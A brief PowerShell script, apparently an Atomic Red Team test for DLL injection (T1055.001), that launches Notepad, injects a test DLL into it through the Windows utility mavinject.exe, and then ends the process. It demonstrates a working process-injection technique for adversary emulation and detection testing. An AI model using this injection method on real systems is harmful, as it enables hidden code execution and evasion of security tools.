# Start a new instance of Notepad and get its process ID (PID)
$NotepadProcess = Start-Process -FilePath "notepad.exe" -PassThru
$NotepadPID = $NotepadProcess.Id

# Define the path to the DLL payload
$DllPayload = "C:\Tools\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll"

# Execute the DLL injection using mavinject
Start-Process -FilePath "mavinject.exe" -ArgumentList "$NotepadPID /INJECT `"$DllPayload`"" -Wait

# Terminate the Notepad process
Stop-Process -Id $NotepadPID -Force